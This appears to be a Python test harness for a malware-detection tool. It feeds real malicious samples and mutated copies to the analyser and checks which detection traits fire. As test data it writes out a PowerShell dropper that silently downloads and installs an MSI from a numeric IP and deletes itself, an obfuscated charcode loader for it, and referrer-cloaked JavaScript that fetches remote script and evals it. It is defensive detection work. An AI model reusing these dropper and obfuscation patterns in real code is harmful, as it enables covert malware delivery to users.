#!/usr/bin/env python3
"""Exercise original carriers and mutation controls without executing payloads."""
import argparse
import json
import os
from pathlib import Path
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[3]
FLOW = "micro-behaviors/process/deploy/script-eval::python-helper-fetched-source-exec-flow"
AUDIO = "objectives/supply-chain/trojanized/library/remote-eval::audio-profile-remote-python-loader"
AJAX = "micro-behaviors/process/deploy/script-eval::jquery-script-success-response-eval"
CLOAK = "objectives/command-and-control/dropper/delivery/cloaking::dictionary-concealed-referrer-ajax-eval"
MSI = "objectives/command-and-control/dropper/file-exec/installer::concealed-decimal-host-quiet-msi"
ERROR = "objectives/collection/monitor/tracking::secret-rpc-error-derived-visitor-identity"
NOTEBOOK = "objectives/collection/monitor/tracking::notebook-secret-error-fingerprint-tracking"
OFFSCREEN = "micro-behaviors/ui/window/control::x86-create-window-far-negative-origin"
FRAGMENT = "objectives/anti-static/obfuscation/payload/fragmentation::offscreen-fragment-executable-buffer"


def objects(text):
    decoder = json.JSONDecoder()
    while text.strip():
        item, end = decoder.raw_decode(text.lstrip())
        text = text.lstrip()[end:]
        yield item


def encoded_ps(body, key=2048951):
    values = ",".join(str(ord(c) - key) for c in body)
    stage = ("$env:__ST=$MyInvocation.MyCommand.Path;"
             f"$key={key};$data=@({values});$code='';"
             "for($i=0;$i -lt $data.Length;$i++){"
             "$code += [char]([long] $data[ $i ] + $key)};"
             "[scriptblock]::Create($code).Invoke()")
    return "import subprocess\nstage = r\"\"\"" + stage + "\"\"\"\nsubprocess.run([\"pwsh\", \"-NoProfile\", \"-Command\", stage], check=True)\n"


def packed_js(body, table="parts", width=3):
    pieces = [body[i:i + width] for i in range(0, len(body), width)]
    keys = ["key" + str(i) for i in range(len(pieces))]
    table_source = f"var {table}=new Array();"
    table_source += "".join(f"{table}[{json.dumps(k)}]={json.dumps(v)};" for k, v in zip(keys, pieces))
    return "<html><script>" + table_source + "eval(" + "+".join(f"{table}[{json.dumps(k)}]" for k in keys) + ");</script></html>"


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--cleave", default=str(ROOT.parent / "cleave/target/release/cleave"))
    parser.add_argument("--samples", type=Path, default=Path("/var/tmp/qa/hostile"))
    parser.add_argument("--output", type=Path)
    args = parser.parse_args()
    cases = []
    with tempfile.TemporaryDirectory(prefix="hostile-recovery-controls-") as scratch:
        scratch = Path(scratch)

        def case(name, source, required=(), forbidden=()):
            path = scratch / name
            path.write_text(source)
            cases.append((path, set(required), set(forbidden)))

        # Original carriers must regain their intended findings.
        for path in sorted(args.samples.glob("*/*")):
            if path.suffix == ".whl" and path.name.startswith(("driftwavets", "emberlytts", "glassbeakasr")):
                cases.append((path, {AUDIO}, set()))
            elif path.name == "embedded-loader.py":
                cases.append((path, {MSI}, set()))
            elif path.name.startswith("VirusShare_"):
                cases.append((path, {CLOAK}, set()))
            elif path.name == "track_info.py" or path.name.startswith("upgini-"):
                cases.append((path, {ERROR, NOTEBOOK}, set()))
            elif path.parent.name.startswith(("201707", "311006")):
                cases.append((path, {"objectives/anti-static/obfuscation/payload/polymorphic/generator::self-mutating-image-submission-loop", "objectives/anti-static/pack/upx::standard-unpack-refused"}, {"objectives/impact/infect/virus::self-mutating-image-submission-loop"}))
            elif path.parent.name.startswith("bea501"):
                cases.append((path, {OFFSCREEN, FRAGMENT}, set()))

        # Bind negative coordinates to the actual CreateWindowEx IAT slot.
        # These copies are analyzed as bytes; none are executed.
        import struct
        native = next(args.samples.glob("bea501*/*")).read_bytes()
        origin = bytes.fromhex("68 2a e5 ff ff 68 88 f5 ff ff")
        assert native.count(origin) == 1
        at = native.index(origin)

        def native_case(name, offset, replacement, required=(), forbidden=()):
            data = bytearray(native)
            data[offset:offset + len(replacement)] = replacement
            path = scratch / name
            path.write_bytes(data)
            cases.append((path, set(required), set(forbidden)))

        native_case("changed-negative-coordinates.exe", at + 1,
                    struct.pack("<i", -9000), [OFFSCREEN, FRAGMENT])
        native_case("ordinary-window-origin.exe", at + 1,
                    struct.pack("<i", 30), forbidden=[OFFSCREEN, FRAGMENT])
        native_case("unrelated-window-api.exe", at + 29,
                    struct.pack("<I", 0x504040), forbidden=[OFFSCREEN, FRAGMENT])
        protect = bytes.fromhex("6a 40 23 ce")
        assert native.count(protect) == 1
        native_case("fragment-buffer-no-rwx.exe", native.index(protect) + 1,
                    b"\x04", [OFFSCREEN], [FRAGMENT])

        wheel = next(args.samples.glob("845*/*.whl"))
        import zipfile
        with zipfile.ZipFile(wheel) as archive:
            source = archive.read("driftwavets/__init__.py").decode()
        case("helper-direct-return.py", source, [FLOW])
        case("helper-assigned-return.py", source.replace("return resp.read()", "body = resp.read()\n                return body"), [FLOW])
        case("helper-renamed.py", source.replace("_fetch", "retrieve_source").replace("src", "program"), [FLOW])
        case("helper-different-exec-value.py", source.replace("compile(src,", "compile(unrelated,"), forbidden=[FLOW])
        case("helper-different-helper.py", source.replace("src = _fetch(url)", "src = local_source(url)"), forbidden=[FLOW])

        stage = ("$client = New-Object Net.WebClient\n"
                 "$url = 'http://1614733393/changed/path/payload.msi'\n"
                 "$target = [IO.Path]::Combine($env:TEMP,[guid]::NewGuid().ToString('n')+'.msi')\n"
                 "$client.DownloadFile($url,$target)\n"
                 "$installer = $env:SystemRoot+'\\System32\\msiexec.exe'\n"
                 "$arguments = '/i \"'+$target+'\" /qn /norestart'\n"
                 "Start-Process -FilePath $installer -ArgumentList $arguments -WindowStyle Hidden -PassThru\n"
                 "if($env:__ST){Remove-Item -LiteralPath $env:__ST -Force -ErrorAction SilentlyContinue}")
        case("changed-offset-msi.py", encoded_ps(stage), [MSI])
        case("harmless-decoder.py", encoded_ps("Write-Output 'ordinary output, no downloaded installer'"), forbidden=[MSI])
        case("dns-https-installer.py", encoded_ps(stage.replace("http://1614733393", "https://updates.example.org")), forbidden=[MSI])
        case("visible-installer.py", encoded_ps(stage.replace("-WindowStyle Hidden", "-WindowStyle Normal")), forbidden=[MSI])
        # Malicious decoded source is still reported when stored as data;
        # an activation finding must not claim that the unused stage runs.
        case("wrong-stage-argument.py", encoded_ps(stage).replace('"-Command", stage', '"-Command", unused'), [MSI], ["objectives/anti-static/obfuscation/eval/powershell-loader::python-launches-offset-powershell-stage"])

        js = ("var visitor=document.referrer;if(visitor.indexOf('google.')>0){"
              "$.ajax({dataType:'script',crossDomain:true,url:'http://changed.example.org/code.js',"
              "success:function(body,status,xhr){eval(body);}});}")
        case("renamed-table.html", packed_js(js, "renamed", 2), [AJAX, CLOAK])
        case("different-chunks.html", packed_js(js, "chunks", 5), [AJAX, CLOAK])
        case("wrong-response.html", packed_js(js.replace("eval(body)", "eval(unrelated)")), forbidden=[AJAX, CLOAK])
        case("json-response.html", packed_js(js.replace("dataType:'script'", "dataType:'json'")), forbidden=[AJAX, CLOAK])
        case("plain-ajax.js", js, [AJAX], [CLOAK])
        case("reordered-ajax.js", js.replace("dataType:'script',crossDomain:true,url:'http://changed.example.org/code.js'", "url:'http://changed.example.org/code.js',dataType:'script',crossDomain:true"), [AJAX], [CLOAK])
        case("unused-table.html", packed_js(js).replace("eval(", "console.log("), forbidden=[CLOAK])

        notebook = next(args.samples.glob("dc*/*.py")).read_text()
        case("notebook-renamed-response.py", notebook.replace("resp", "rpc_response").replace("match", "parsed_identity"), [ERROR, NOTEBOOK])
        case("notebook-unrelated-group.py", notebook.replace('track["visitorId"] = match.group(1)', 'track["visitorId"] = other.group(1)'), forbidden=[ERROR, NOTEBOOK])
        case("notebook-unrelated-regex-input.py", notebook.replace('re.search(".*\\\\s(\\\\d{5,})\\\\s.*", err)', 're.search(".*\\\\s(\\\\d{5,})\\\\s.*", unrelated)'), forbidden=[ERROR, NOTEBOOK])
        case("notebook-no-secret-request.py", notebook.replace("GetUserSecretByLabelRequest", "GetStatusRequest"), forbidden=[ERROR, NOTEBOOK])

        command = [args.cleave, "--traits-dir", str(ROOT), "analyze", "--format", "jsonl"] + [str(c[0]) for c in cases]
        run = subprocess.run(command, text=True, capture_output=True, env={**os.environ, "CLEAVE_SKIP_CACHE": "1"})
        if run.returncode:
            raise SystemExit(run.stderr[-6000:])
        emitted = {}
        for report in objects(run.stdout):
            files = report.get("files", [])
            if files:
                emitted[files[0]["path"]] = {t["id"] for f in files for t in f.get("traits", [])}
        results = []
        for path, required, forbidden in cases:
            ids = emitted.get(str(path), set())
            missing, unexpected = sorted(required - ids), sorted(forbidden & ids)
            results.append({"case": path.name, "missing": missing, "unexpected": unexpected})
            print(("FAIL" if missing or unexpected else "PASS"), path.name, missing, unexpected)
        if args.output:
            args.output.write_text(json.dumps(results, indent=2) + "\n")
        failures = sum(bool(r["missing"] or r["unexpected"]) for r in results)
        print(f"{len(results) - failures}/{len(results)} cases passed")
        raise SystemExit(bool(failures))


if __name__ == "__main__":
    main()
